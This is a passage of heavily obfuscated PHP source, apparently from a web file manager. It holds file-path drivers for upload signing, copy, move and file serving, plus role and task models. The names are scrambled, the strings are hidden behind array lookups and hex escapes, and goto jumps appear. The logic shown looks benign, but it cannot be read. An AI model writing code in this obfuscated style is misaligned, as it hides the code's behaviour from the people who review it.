__construct($¢ßµ”áì) { parent::__construct($¢ßµ”áì); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } public function uploadFormData($®õ¨ïœù, $Å‹²¶Š³ = 3600) { $–É„øÛ† =& $_SERVER[Ùæõ‰Ï’]; $—ÓâÒ‡ = $–É„øÛ†[229]; $ò€¾‰‰ì = $–É„øÛ†[263]; $ë¨šœÖ¢ = $–É„øÛ†[274]; $†Ü×ïáó = gmdate($–É„øÛ†[299], time() + $Å‹²¶Š³); $’¨ÃˆÓñ = (string) time() . $–É„øÛ†[74] . (string) (time() + $Å‹²¶Š³); $»ä³¯™Ş = array($–É„øÛ†[275] => $†Ü×ïáó, $–É„øÛ†[278] => array(array($–É„øÛ†[280] => $—ÓâÒ‡), array($–É„øÛ†[279] => $this->bucket), array($–É„øÛ†[281], $–É„øÛ†[282], $–É„øÛ†[12]), array($–É„øÛ†[285] => $ë¨šœÖ¢), array($–É„øÛ†[1423] => $ò€¾‰‰ì), array($–É„øÛ†[1424] => $this->accessKey), array($–É„øÛ†[1425] => $’¨ÃˆÓñ))); $»ä³¯™Ş = json_encode($»ä³¯™Ş); $¬¸µ÷èÓ = hash_hmac($–É„øÛ†[263], $’¨ÃˆÓñ, $this->secret); $…ö’¹Ü¦ = sha1($»ä³¯™Ş); $ÕÈÙ¨ò = hash_hmac($–É„øÛ†[263], $…ö’¹Ü¦, $¬¸µ÷èÓ); $×¡‡öå = array($–É„øÛ†[280] => $—ÓâÒ‡, $–É„øÛ†[285] => $ë¨šœÖ¢, $–É„øÛ†[293] => base64_encode($»ä³¯™Ş), $–É„øÛ†[1423] => $ò€¾‰‰ì, $–É„øÛ†[1424] => $this->accessKey, $–É„øÛ†[1426] => $’¨ÃˆÓñ, $–É„øÛ†[1427] => $ÕÈÙ¨ò, $–É„øÛ†[208] => $this->getHost()); return $×¡‡öå; } public function fileOutImage($õÑ Ã¢, $´Û‹Éàç = 250) { $Ğí‚¸—í =& $_SERVER[Ùæõ‰Ï’]; if ($this->size($õÑ Ã¢) > 1024 * 1024 * 32) { return $this->fileOutImageServer($õÑ Ã¢, $´Û‹Éàç); } $Ã¯Ê‹ÆØ = $this->link($õÑ Ã¢); $Ã¯Ê‹ÆØ .= $Ğí‚¸—í[1428] . $´Û‹Éàç . $Ğí‚¸—í[1429]; $this->fileOutLink($Ã¯Ê‹ÆØ); } public function fileOutLink($÷–Ğş–) { $¤Ø‰õ®¦ =& $_SERVER[Ùæõ‰Ï’]; if (substr($÷–Ğş–, 0, 7) == $¤Ø‰õ®¦[313]) { $÷–Ğş– = $¤Ø‰õ®¦[314] . substr($÷–Ğş–, 7); } header($¤Ø‰õ®¦[175] . $÷–Ğş–); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Îùñ†¡Õ) { $this->pathParse = $Îùñ†¡Õ; $this->model = Model($_SERVER[Ùæõ‰Ï’][1430]); } public function getPath($ÔïÚß¡´) { return trim($ÔïÚß¡´, $_SERVER[Ùæõ‰Ï’][8]); } public function pathFather($î×àŞÕÈ) { $ÌÄ€Ö»• = $this->parse($î×àŞÕÈ); $ÌÄ€Ö»• = $this->infoSimple($î×àŞÕÈ); return $ÌÄ€Ö»• ? $ÌÄ€Ö»•[$_SERVER[Ùæõ‰Ï’][192]] : !1; } public function pathThis($Û˜İ«ßŸ) { $©ÛååÆ² = $this->infoSimple($Û˜İ«ßŸ); return $©ÛååÆ² ? $©ÛååÆ²[$_SERVER[Ùæõ‰Ï’][32]] : !1; } public function getPathOuter($Îâ–€„¬) { if (!$Îâ–€„¬) { return $Îâ–€„¬; } $ƒÚÃŞ© = $this->parse($Îâ–€„¬); return KodIO::make($ƒÚÃŞ©[$_SERVER[Ùæõ‰Ï’][475]]); } public function copyFolderFromIO($ãçôöôÁ, $Û˜¯“ºş, $·öûÈé, $°™ÆÊ¬Ê, $âÀŸÍÒ) { $Ó•·âŒ´ = $this->model->copyFolderFromIO($ãçôöôÁ, $Û˜¯“ºş, $·öûÈé, $°™ÆÊ¬Ê, $âÀŸÍÒ); return KodIO::make($Ó•·âŒ´); } public function isParentOf($©¼Á¦Ü, $…ÅçºÙÕ) { return $this->model->isParentOf($©¼Á¦Ü, $…ÅçºÙÕ); } public function mkfile($Ñ‰³ßÂ£, $áÌËï¦ = '', $íáÒñ·í = REPEAT_RENAME) { $•×ûŸ‘ =& $_SERVER[Ùæõ‰Ï’]; $Ø·Ñ†´Š = $this->parse($Ñ‰³ßÂ£); $Ñ‰³ßÂ£ = $Ø·Ñ†´Š[$•×ûŸ‘[475]]; for ($Æí–¨âñ = 0; $Æí–¨âñ < count($Ø·Ñ†´Š[$•×ûŸ‘[1431]]); $Æí–¨âñ++) { $ş¦·ãªê = $Ø·Ñ†´Š[$•×ûŸ‘[1431]][$Æí–¨âñ]; if ($Æí–¨âñ == count($Ø·Ñ†´Š[$•×ûŸ‘[1431]]) - 1) { $Ñ‰³ßÂ£ = $this->model->mkfile($Ñ‰³ßÂ£, $ş¦·ãªê, $áÌËï¦, $íáÒñ·í); break; } $Ñ‰³ßÂ£ = $this->model->mkdir($Ñ‰³ßÂ£, $ş¦·ãªê, REPEAT_SKIP); } return $this->getPathOuter($Ñ‰³ßÂ£); } public function mkdir($Üœâ”Ïï, $¼€ûµşŸ = REPEAT_SKIP) { $òéüÙş =& $_SERVER[Ùæõ‰Ï’]; $¸±Ëøñ = $this->parse($Üœâ”Ïï); $Üœâ”Ïï = $¸±Ëøñ[$òéüÙş[475]]; for ($ø•„šÀÙ = 0; $ø•„šÀÙ < count($¸±Ëøñ[$òéüÙş[1431]]); $ø•„šÀÙ++) { $¤Î»³»£ = $¸±Ëøñ[$òéüÙş[1431]][$ø•„šÀÙ]; $Üœâ”Ïï = $this->model->mkdir($Üœâ”Ïï, $¤Î»³»£, $¼€ûµşŸ); } return $this->getPathOuter($Üœâ”Ïï); } public function copyFile($…âëœÇ, $”Èîñµ¹, $„¢ä„ƒ¯ = REPEAT_REPLACE) { $üé™…¹’ =& $_SERVER[Ùæõ‰Ï’]; $Èç‚ÎÇí = $this->parse($”Èîñµ¹); $‚¥ºÃ¯Œ = $this->model->copy($…âëœÇ, $Èç‚ÎÇí[$üé™…¹’[475]], $„¢ä„ƒ¯, $Èç‚ÎÇí[$üé™…¹’[87]]); return $‚¥ºÃ¯Œ ? $this->getPathOuter($‚¥ºÃ¯Œ) : !1; } public function moveFile($³Ü‚Ú, $µÊÄ¾ß‘, $•¤†õ€ = REPEAT_REPLACE) { $ˆæĞ±Æ† =& $_SERVER[Ùæõ‰Ï’]; $­Ê›»•® = $this->parse($µÊÄ¾ß‘); $û”¶ÍÚ = $this->model->move($³Ü‚Ú, $­Ê›»•®[$ˆæĞ±Æ†[475]], $•¤†õ€, $­Ê›»•®[$ˆæĞ±Æ†[87]]); return $û”¶ÍÚ ? $this->getPathOuter($û”¶ÍÚ) : !1; } public function copy($Á™ïò„, $¹¡â¸­Ğ, $ÜĞ·éĞÜ = REPEAT_REPLACE, $¶§Õ¬Òç = false) { $ÁÒíÒû§ = $this->parse($¹¡â¸­Ğ); $•¢Ìë•× = $this->model->copy($Á™ïò„, $ÁÒíÒû§[$_SERVER[Ùæõ‰Ï’][475]], $ÜĞ·éĞÜ, $¶§Õ¬Òç); return $•¢Ìë•× ? $this->getPathOuter($•¢Ìë•×) : !1; } public function moveSameAllow() { } public function move($¥ƒ­ èÍ, $æÃçÜˆà, $ Ô…’ã£ = REPEAT_REPLACE, $³°¥€Øê = false) { $à‡»˜ = $this->parse($æÃçÜˆà); $‰©Ü±ï· = $this->model->move($¥ƒ­ èÍ, $à‡»˜[$_SERVER[Ùæõ‰Ï’][475]], $ Ô…’ã£, $³°¥€Øê); return $‰©Ü±ï· ? $this->getPathOuter($‰©Ü±ï·) : !1; } public function remove($’Õœ„¼µ, $ù©¬’¢™ = true) { return $this->model->remove($’Õœ„¼µ, $ù©¬’¢™); } public function rename($Š¢ÈÂ‚, $ˆÏ½¿ï) { $Ğ±Ê­³Œ = $this->model->rename($Š¢ÈÂ‚, $ˆÏ½¿ï); return $Ğ±Ê­³Œ ? $this->getPathOuter($Š¢ÈÂ‚) : $Ğ±Ê­³Œ; } public function size($½÷Áö™) { $ÃşÓ—‹ = $this->infoSimple($½÷Áö™); return $ÃşÓ—‹ ? $ÃşÓ—‹[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function infoSimple($à¥Ã·™) { return $this->model->sourceInfo($à¥Ã·™); } public function info($­ÑÓé¸Ç) { return $this->infoParse($­ÑÓé¸Ç); } public function infoAuth($õ«Á²Ü¹) { return $this->infoParse($õ«Á²Ü¹, !1, !0); } public function infoWithChildren($ÇÌ”¯¨¸) { return $this->infoParse($ÇÌ”¯¨¸, !0); } protected function infoParse($Úº°±±³, $çº÷ÚÓ = false, $ĞŠ¸±ÛÏ = false) { if (!$çº÷ÚÓ) { return $this->model->pathInfo($Úº°±±³, $ĞŠ¸±ÛÏ); } return $this->model->pathInfoMore($Úº°±±³); } public function infoFullSimple($–ñŞ³É) { $‰ñÖªõ³ =& $_SERVER[Ùæõ‰Ï’]; $ÀâºöÍë = explode($‰ñÖªõ³[8], $–ñŞ³É); $ŞÉ¹‡¤½ = implode($‰ñÖªõ³[8], array_splice($ÀâºöÍë, 1)); return $this->model->pathInfoByPath($ÀâºöÍë[0], $ŞÉ¹‡¤½); } public function infoFull($ğ÷ÁşşË) { $ƒÉ¢À = $this->infoFullSimple($ğ÷ÁşşË); return is_array($ƒÉ¢À) ? $this->model->pathInfo($ƒÉ¢À[$_SERVER[Ùæõ‰Ï’][193]]) : !1; } public function hashSimple($Æ¾«ü¯) { $¿ù›€Ç‡ =& $_SERVER[Ùæõ‰Ï’]; $Ú²ŸèÀš = $this->infoWithChildren($Æ¾«ü¯); return $Ú²ŸèÀš[$¿ù›€Ç‡[170]][$¿ù›€Ç‡[672]]; } public function hashMd5($‰”·µ”ı) { $ò»¤¡ş =& $_SERVER[Ùæõ‰Ï’]; $™Ú‹ã• = $this->infoWithChildren($‰”·µ”ı); return $™Ú‹ã•[$ò»¤¡ş[170]][$ò»¤¡ş[547]]; } public function exist($É€ºß€é) { $ëä¶ç²ì =& $_SERVER[Ùæõ‰Ï’]; $õÕŸ” = $this->parse($É€ºß€é); if (!$õÕŸ”[$ëä¶ç²ì[87]]) { return $this->isFile($É€ºß€é) || $this->isFolder($É€ºß€é); } $ŠŞÓˆàï = array($ëä¶ç²ì[477] => $õÕŸ”[$ëä¶ç²ì[475]], $ëä¶ç²ì[32] => $õÕŸ”[$ëä¶ç²ì[87]]); $©¢Æ§ØŞ = $this->model->where($ŠŞÓˆàï)->find(); return $©¢Æ§ØŞ ? !0 : !1; } public function isFile($ÖÇœ²ç) { $Ã»·ğºğ =& $_SERVER[Ùæõ‰Ï’]; $ ×ª…Ğ¦ = $this->infoSimple($ÖÇœ²ç); return $ ×ª…Ğ¦ && $ ×ª…Ğ¦[$Ã»·ğºğ[485]] == $Ã»·ğºğ[228] ? !0 : !1; } public function isFolder($ÂÅœÑ‰ ) { $µéµƒÀ¶ =& $_SERVER[Ùæõ‰Ï’]; $šÛ’ÅâÔ = $this->infoSimple($ÂÅœÑ‰ ); return $šÛ’ÅâÔ && $šÛ’ÅâÔ[$µéµƒÀ¶[485]] == $µéµƒÀ¶[91] ? !0 : !1; } public function listPath($ÍÏÖŸº·, $£ùĞÌ™« = false) { $ŸğÕ— =& $_SERVER[Ùæõ‰Ï’]; if ($ÍÏÖŸº· == $ŸğÕ—[12]) { return !1; } $Ó¼Å“ÈÇ = array($ŸğÕ—[477] => $ÍÏÖŸº·); if ($£ùĞÌ™«) { return $this->model->listSource($Ó¼Å“ÈÇ, -1); } return $this->model->listSource($Ó¼Å“ÈÇ); } public function has($İİ¨¥¬, $üğÊ³ = false, $ú´ÛÒŒÉ = null) { $ßù†»ØÔ =& $_SERVER[Ùæõ‰Ï’]; $®¥Íñ¯¢ = $this->infoWithChildren($İİ¨¥¬); if ($üğÊ³) { return array($ßù†»ØÔ[240] => $®¥Íñ¯¢[$ßù†»ØÔ[240]], $ßù†»ØÔ[239] => $®¥Íñ¯¢[$ßù†»ØÔ[239]]); } return $ú´ÛÒŒÉ ? $®¥Íñ¯¢[$ßù†»ØÔ[240]] : $®¥Íñ¯¢[$ßù†»ØÔ[239]]; } public function listAll($’Ù˜‹) { $¡È¬ğÕ = IO::info($this->pathParse[$_SERVER[Ùæõ‰Ï’][87]]); if (!$¡È¬ğÕ) { return array(); } return $this->model->listAll($’Ù˜‹); } public function getContent($ÑÑÙæşÒ) { return $this->model->getContent($ÑÑÙæşÒ); } public function setContent($İ‰Æ€„©, $µì’øåÎ = '') { return $this->model->setContent($İ‰Æ€„©, $µì’øåÎ); } public function fileSubstr($’»ëÃ, $áíŞ´ä©, $¾Ú‰õŠ€) { return $this->model->fileSubstr($’»ëÃ, $áíŞ´ä©, $¾Ú‰õŠ€); } public function download($¨Ü‚åîû, $·œ†¸ô· = '') { $ÑçÇßĞ = get_path_father($·œ†¸ô·); $é¡¦Í« = get_path_this($·œ†¸ô·); $±íú«Á„ = $this->model->fileInfoGet($¨Ü‚åîû); $àœ”‚Şé = IO::copy($±íú«Á„[$_SERVER[Ùæõ‰Ï’][87]], $ÑçÇßĞ, !1, $é¡¦Í«); return $àœ”‚Şé; } public function setModifyTime($•ßÊç¢‚, $ú§§Î† = '') { $»ìóûİş =& $_SERVER[Ùæõ‰Ï’]; if (!$•ßÊç¢‚) { return; } $this->model->where(array($»ìóûİş[491] => $•ßÊç¢‚))->save(array($»ìóûİş[88] => $ú§§Î†)); } public function upload($Æ÷¡÷ˆ , $ç„Ï‘²±, $à¶¹¼ı– = false, $Õ³› = REPEAT_REPLACE) { $¨½£¨ùœ =& $_SERVER[Ùæõ‰Ï’]; $¶©Û•á• = $this->parse($Æ÷¡÷ˆ ); $ş«¡ïÉî = $this->model->addFile($¶©Û•á•[$¨½£¨ùœ[475]], $ç„Ï‘²±, $¶©Û•á•[$¨½£¨ùœ[87]], $à¶¹¼ı–, $Õ³›); return $this->getPathOuter($ş«¡ïÉî); } public function uploadFileByID($åó€¶í, $Ñ×Çí«ú, $†‘ôßïí) { $±²šÁ =& $_SERVER[Ùæõ‰Ï’]; $¼õñø = $this->parse($åó€¶í); $˜çÌŸ‡Æ = $this->model->addFileByFileID($¼õñø[$±²šÁ[475]], $Ñ×Çí«ú, $¼õñø[$±²šÁ[87]], $†‘ôßïí); return $this->getPathOuter($˜çÌŸ‡Æ); } public function addFileByRemote($¦’›Ã¤€, $Ö–ÅÀÑ, $áÈ‘›¼ = array(), $¤Óî¨‰ù = '', $²ÏÜ…ìÕ) { $©ş£Ìù¸ =& $_SERVER[Ùæõ‰Ï’]; $¡±Ñ®Ç€ = $this->parse($¦’›Ã¤€); $¤Óî¨‰ù = empty($¤Óî¨‰ù) ? $¡±Ñ®Ç€[$©ş£Ìù¸[87]] : $¤Óî¨‰ù; $¼üø•àĞ = $this->model->addFileByRemote($¡±Ñ®Ç€[$©ş£Ìù¸[475]], $Ö–ÅÀÑ, $¤Óî¨‰ù, $áÈ‘›¼, $²ÏÜ…ìÕ); return $this->getPathOuter($¼üø•àĞ); } public function uploadLink($Î¹•Œ½Ï, $Ó…­Ã… = 0) { $£¸•Š¿Š =& $_SERVER[Ùæõ‰Ï’]; $á§Ø¯¦ = $this->parse($Î¹•Œ½Ï); $™ı¶ô¢Û = _get($GLOBALS[$£¸•Š¿Š[7]], $£¸•Š¿Š[1432]); $“÷æº‡‡ = _get($GLOBALS[$£¸•Š¿Š[7]], $£¸•Š¿Š[1433]); $Î¹•Œ½Ï = Model($£¸•Š¿Š[674])->createFileName($á§Ø¯¦[$£¸•Š¿Š[87]], $™ı¶ô¢Û, $“÷æº‡‡); return IO::uploadLink($Î¹•Œ½Ï, $Ó…­Ã…); } public function fileNameAuto($¼®ß¥ë, $¦İïÛÛÓ, $©éşôÂ¨ = REPEAT_REPLACE, $²ô‘Øİ‚ = false) { return $this->model->fileNameAuto($¼®ß¥ë, $¦İïÛÛÓ, $©éşôÂ¨, $²ô‘Øİ‚); } public function fileNameExist($È­˜¯®Ü, $Ô²××âë) { return $this->model->fileNameExist($È­˜¯®Ü, $Ô²××âë); } protected function _fileOut($¬Š¶õø, $¿øéÓÓê = false, $àµ”¨û = false, $´œšê¾˜ = '', $¾Ç‹½Š¦ = false) { $³½½™ğ† =& $_SERVER[Ùæõ‰Ï’]; $ò‚ÚÖËĞ = $this->model->sourceInfo($¬Š¶õø); if ($ò‚ÚÖËĞ[$³½½™ğ†[485]] == $³½½™ğ†[91]) { header($³½½™ğ†[1434]); die; } $°š²×¢Á = $this->model->fileInfoGet($¬Š¶õø); $´œšê¾˜ = $°š²×¢Á[$³½½™ğ†[547]] ? $°š²×¢Á[$³½½™ğ†[547]] : $´œšê¾˜; $˜ÈÉÌÍÛ = isset($GLOBALS[$³½½™ğ†[182]]) && is_array($GLOBALS[$³½½™ğ†[182]]) ? $GLOBALS[$³½½™ğ†[182]][$³½½™ğ†[32]] : $ò‚ÚÖËĞ[$³½½™ğ†[32]]; if ($¾Ç‹½Š¦) { return IO::fileOutServer($°š²×¢Á[$³½½™ğ†[87]], $¿øéÓÓê, $˜ÈÉÌÍÛ, $´œšê¾˜); } IO::fileOut($°š²×¢Á[$³½½™ğ†[87]], $¿øéÓÓê, $˜ÈÉÌÍÛ, $´œšê¾˜); } public function fileOut($à¼ØÔêŠ, $‘€á·‚ = false, $¯Š¶³†” = false, $á¼‡†Öß = '') { $this->_fileOut($à¼ØÔêŠ, $‘€á·‚, $¯Š¶³†”, $á¼‡†Öß); } public function fileOutServer($›ƒ´æèÕ, $Œ×ñ–¢Ü = false, $ÕáÍµÔ¼ = false, $¹¦‚êŒ‘ = '') { $this->_fileOut($›ƒ´æèÕ, $Œ×ñ–¢Ü, $ÕáÍµÔ¼, $¹¦‚êŒ‘, !0); } protected function _fileOutImage($–ŞÁ†Ç¹, $§ŞÉ»¶• = 250) { $÷Í¡èçÖ =& $_SERVER[Ùæõ‰Ï’]; $ŞÔÇ¥ç = $this->model->pathInfo($–ŞÁ†Ç¹); if ($ŞÔÇ¥ç[$÷Í¡èçÖ[485]] == $÷Í¡èçÖ[91]) { show_json($÷Í¡èçÖ[1435] . $–ŞÁ†Ç¹, !1); } $âí˜à×ó = $this->model->fileInfoGet($–ŞÁ†Ç¹); $ŞÔÇ¥ç[$÷Í¡èçÖ[183]] = $âí˜à×ó[$÷Í¡èçÖ[87]]; $GLOBALS[$÷Í¡èçÖ[182]] = $ŞÔÇ¥ç; IO::fileOutImage($âí˜à×ó[$÷Í¡èçÖ[87]], $§ŞÉ»¶•); } public function fileOutImage($òĞşË˜, $¥ª‡üßÇ = 250) { $this->_fileOutImage($òĞşË˜, $¥ª‡üßÇ); } public function fileOutImageServer($¢ òÒ¸³, $¸Îñš„‡ = 250) { $this->_fileOutImage($¢ òÒ¸³, $¸Îñš„‡); } public function link($òÇ‡ˆê, $›¢¡²å = '') { $í¬äí¢Ø = $this->model->fileInfoGet($òÇ‡ˆê); return IO::link($í¬äí¢Ø[$_SERVER[Ùæõ‰Ï’][87]], $›¢¡²å); } protected function parse($ŞÂáÄ) { $˜ìÌâôŠ =& $_SERVER[Ùæõ‰Ï’]; if (strstr($ŞÂáÄ, $˜ìÌâôŠ[8]) === !1) { return array($˜ìÌâôŠ[493] => intval($ŞÂáÄ), $˜ìÌâôŠ[87] => $˜ìÌâôŠ[12], $˜ìÌâôŠ[1431] => array()); } $èëİöíË = explode($˜ìÌâôŠ[8], trim($ŞÂáÄ, $˜ìÌâôŠ[8])); if (count($èëİöíË) < 2) { show_tips(clear_html($ŞÂáÄ) . $˜ìÌâôŠ[1436]); } return array($˜ìÌâôŠ[493] => intval($èëİöíË[0]), $˜ìÌâôŠ[87] => $èëİöíË[1], $˜ìÌâôŠ[1431] => array_slice($èëİöíË, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ù ¡×±¯) { $this->pathParse = $Ù ¡×±¯; $this->model = Model($_SERVER[Ùæõ‰Ï’][1430]); } public function getPathOuter($ÅèÁ±ÊÇ) { $‚·‚“ğ© =& $_SERVER[Ùæõ‰Ï’]; if (!$ÅèÁ±ÊÇ) { return $ÅèÁ±ÊÇ; } $ºÁ›ı = $this->parse($ÅèÁ±ÊÇ); return trim(KodIO::makeShare($this->pathParse[$‚·‚“ğ©[475]], $ºÁ›ı[$‚·‚“ğ©[475]]), $‚·‚“ğ©[8]); } protected function infoParse($È±ú¥–, $¹ÙêÈ™ë = false, $÷÷ïğèà = false) { $—é»ú÷¨ =& $_SERVER[Ùæõ‰Ï’]; $òÂğáêÇ = $this->pathParse[$—é»ú÷¨[475]]; $†ç¥¯ëì = trim($this->pathParse[$—é»ú÷¨[1263]], $—é»ú÷¨[8]); return Action($—é»ú÷¨[1437])->sharePathInfo($òÂğáêÇ, $†ç¥¯ëì, $¹ÙêÈ™ë); } public function infoFull($‡É¥ü¸Í) { $©¿åª‘Š =& $_SERVER[Ùæõ‰Ï’]; $­æ¶’®ç = explode($©¿åª‘Š[8], trim($‡É¥ü¸Í, $©¿åª‘Š[8])); if (count($­æ¶’®ç) > 1) { $¤Ä¶óÑ = implode($©¿åª‘Š[8], array_splice($­æ¶’®ç, 1)); $¨„—Èãé = $this->model->pathInfoByPath($­æ¶’®ç[0], $¤Ä¶óÑ); if (!$¨„—Èãé) { return !1; } $this->pathParse[$©¿åª‘Š[1263]] = $¨„—Èãé[$©¿åª‘Š[193]]; } return $this->infoParse($‡É¥ü¸Í); } public function listAll($¿÷úòšî) { $ö»“ÙÕó =& $_SERVER[Ùæõ‰Ï’]; $ûğûÆ­İ = IO::info($this->pathParse[$ö»“ÙÕó[87]]); if (!$ûğûÆ­İ) { return array(); } $ÔÛå  = $this->model->listAll($¿÷úòšî); $Ú‰‘ªü = Model($ö»“ÙÕó[664])->getInfo($ûğûÆ­İ[$ö»“ÙÕó[665]]); foreach ($ÔÛå  as &$µÂîºìÂ) { check_abort(); $µÂîºìÂ[$ö»“ÙÕó[90]] = Action($ö»“ÙÕó[1437])->_shareItemeParse($µÂîºìÂ[$ö»“ÙÕó[90]], $Ú‰‘ªü); } unset($µÂîºìÂ); return $ÔÛå ; } } goto fÖÎ¶Û¥; E·–ñó‘ƒ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\162\x6f\154\145\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x61\165\x74\x68", "\x6c\141\x62\145\x6c", "\x64\x69\163\160\154\x61\x79", "\163\x79\163\x74\145\x6d", "\144\x65\x73\143", "\151\x67\156\x6f\x72\x65\105\170\164", "\151\x67\156\x6f\162\x65\x46\x69\x6c\x65\123\151\172\x65", "\141\144\155\151\156\151\163\164\162\x61\164\x6f\x72", "\x73\x6f\x72\164"); public function listData($ùÏéÈã« = false, $‘èË²—Å = "\163\x6f\x72\164", $Ôš“Ş‚Ï = false) { $ıÍ åó =& $_SERVER[Ùæõ‰Ï’]; $¼åš•¸° = parent::listData($ùÏéÈã«, $‘èË²—Å, $Ôš“Ş‚Ï); if (!$ùÏéÈã«) { foreach ($¼åš•¸° as $ìîŸÀÛã => $ùŒ”ë…ò) { if ($ùŒ”ë…ò[$ıÍ åó[2186]] == 1) { $¼åš•¸°[$ìîŸÀÛã][$ıÍ åó[526]] = LNG($ıÍ åó[2448]); } } } return $¼åš•¸°; } public function update($ĞìÉãñ¶, $’æ§’ƒø) { $Ñ­ú³‡Ã =& $_SERVER[Ùæõ‰Ï’]; $Ï°úİšÑ = parent::listData($ĞìÉãñ¶); $•‡œùÂŸ = $this->findByName($’æ§’ƒø[$Ñ­ú³‡Ã[32]]); if (!$Ï°úİšÑ || $•‡œùÂŸ && $•‡œùÂŸ[$Ñ­ú³‡Ã[475]] != $Ï°úİšÑ[$Ñ­ú³‡Ã[475]]) { return !1; } if ($•‡œùÂŸ[$Ñ­ú³‡Ã[2186]] == 1) { $’æ§’ƒø = array($Ñ­ú³‡Ã[32] => $’æ§’ƒø[$Ñ­ú³‡Ã[32]], $Ñ­ú³‡Ã[2002] => $’æ§’ƒø[$Ñ­ú³‡Ã[2002]]); } $this->filterAuth($’æ§’ƒø[$Ñ­ú³‡Ã[487]]); return parent::update($ĞìÉãñ¶, $’æ§’ƒø); } public function remove($ù÷É¼·) { $ÀÃäŞÛû = parent::listData($ù÷É¼·); if (!$ÀÃäŞÛû || $ÀÃäŞÛû[$_SERVER[Ùæõ‰Ï’][191]]) { return !1; } return parent::remove($ù÷É¼·); } public function add($Çˆ¿é¸) { $é‡êĞ´ì =& $_SERVER[Ùæõ‰Ï’]; $˜Øßê†Á = $Çˆ¿é¸[$é‡êĞ´ì[32]]; if ($this->findByName($˜Øßê†Á)) { return !1; } $»¼ …¼² = array($é‡êĞ´ì[494] => $˜Øßê†Á, $é‡êĞ´ì[1985] => $é‡êĞ´ì[12], $é‡êĞ´ì[1981] => $é‡êĞ´ì[1989], $é‡êĞ´ì[2449] => 1, $é‡êĞ´ì[1984] => 0, $é‡êĞ´ì[2450] => 0, $é‡êĞ´ì[1983] => $this->getSort()); $Çˆ¿é¸ = array_merge($»¼ …¼², $Çˆ¿é¸); $this->filterAuth($Çˆ¿é¸[$é‡êĞ´ì[487]]); return parent::insert($Çˆ¿é¸); } private function getSort() { $ì‘èï =& $_SERVER[Ùæõ‰Ï’]; $ê¹Ûà¦Ó = parent::listData(); $‘Æ´ÉÓÒ = array_to_keyvalue($ê¹Ûà¦Ó, $ì‘èï[12], $ì‘èï[2003]); return empty($‘Æ´ÉÓÒ) ? 0 : max($‘Æ´ÉÓÒ) + 1; } private function filterAuth(&$üÙ÷„Ä¡) { $¦¬½¢Âù =& $_SERVER[Ùæõ‰Ï’]; $ƒíí‚ßÖ = array(); $Æ˜êÊñ¶ = array_filter(explode($¦¬½¢Âù[50], $üÙ÷„Ä¡)); foreach ($Æ˜êÊñ¶ as $üÙ÷„Ä¡) { $€ëêÜë = explode($¦¬½¢Âù[10], $üÙ÷„Ä¡); if ($€ëêÜë[0] == $¦¬½¢Âù[2451] && $€ëêÜë[1] != $¦¬½¢Âù[1288]) { $ñïÆº„’ = $€ëêÜë[0] . $¦¬½¢Âù[10] . $€ëêÜë[1] . $¦¬½¢Âù[2452]; if (!in_array($ñïÆº„’, $Æ˜êÊñ¶)) { $ƒíí‚ßÖ[] = $ñïÆº„’; } } $ƒíí‚ßÖ[] = $üÙ÷„Ä¡; } $üÙ÷„Ä¡ = implode($¦¬½¢Âù[50], $ƒíí‚ßÖ); } public function findRoleDefault() { $å†ÙšÊÉ =& $_SERVER[Ùæõ‰Ï’]; $·…ìÁ‡ = parent::listData(); $†À®¼şä = !1; foreach ($·…ìÁ‡ as $‹¦›Æ†Â) { if (!$‹¦›Æ†Â || $‹¦›Æ†Â[$å†ÙšÊÉ[2001]] == $å†ÙšÊÉ[228] || $‹¦›Æ†Â[$å†ÙšÊÉ[2186]] == 1) { continue; } if (strstr($‹¦›Æ†Â[$å†ÙšÊÉ[487]], $å†ÙšÊÉ[2453])) { continue; } if (!strstr($‹¦›Æ†Â[$å†ÙšÊÉ[487]], $å†ÙšÊÉ[2454])) { continue; } if (!$†À®¼şä) { $†À®¼şä = $‹¦›Æ†Â; continue; } $†ğä­ˆ¹ = explode($å†ÙšÊÉ[50], $†À®¼şä[$å†ÙšÊÉ[487]]); $½í§·èµ = explode($å†ÙšÊÉ[50], $‹¦›Æ†Â[$å†ÙšÊÉ[487]]); if (count($†ğä­ˆ¹) > count($½í§·èµ)) { $†À®¼şä = $‹¦›Æ†Â; } } return $†À®¼şä ? $†À®¼şä[$å†ÙšÊÉ[475]] : $å†ÙšÊÉ[12]; } public function sort($œâ¬áƒï, $¨’µôˆ) { return parent::update($œâ¬áƒï, $¨’µôˆ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x74\x61\x73\153\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\x74\x79\160\x65", "\145\x76\145\x6e\164", "\164\x69\155\145", "\x64\x65\x73\x63", "\x73\x79\x73\x74\145\155", "\x65\156\141\x62\154\x65", "\154\141\163\164\122\165\156", "\163\157\162\164"); public function listData($ô†Í…½½ = false, $¸ˆ×Ô“ = "\163\x6f\x72\164", $á­‘²Üë = false) { return parent::listData($ô†Í…½½, $¸ˆ×Ô“, $á­‘²Üë); } public function add($§¢á÷£à) { $ÕÔÁ‹ˆ± =& $_SERVER[Ùæõ‰Ï’]; $©Ü¥® = $this->findByName($§¢á÷£à[$ÕÔÁ‹ˆ±[32]]); if ($©Ü¥®) { return !1; } $§¢á÷£à[$ÕÔÁ‹ˆ±[1732]] = 0; $§¢á÷£à[$ÕÔÁ‹ˆ±[2003]] = $this->getSort(); return parent::insert($§¢á÷£à); } private function getSort() { $Õ’şÉ¤ =& $_SERVER[Ùæõ‰Ï’]; $ĞØİ·ß = parent::listData(); $ØÇİ‘¡ = array_to_keyvalue($ĞØİ·ß, $Õ’şÉ¤[12], $Õ’şÉ¤[2003]); return empty($ØÇİ‘¡) ? 0 : max($ØÇİ‘¡) + 1; } public function update($¦ËÕ³Óà, $â¼åµÚ²) { $¸ú¸±öÃ =& $_SERVER[Ùæõ‰Ï’]; $İê±ÃÖÎ = $this->listData($¦ËÕ³Óà); $†Ö¨Ğî = $this->findByName($â¼åµÚ²[$¸ú¸±öÃ[32]]); if (!$İê±ÃÖÎ || $†Ö¨Ğî && $†Ö¨Ğî[$¸ú¸±öÃ[475]] != 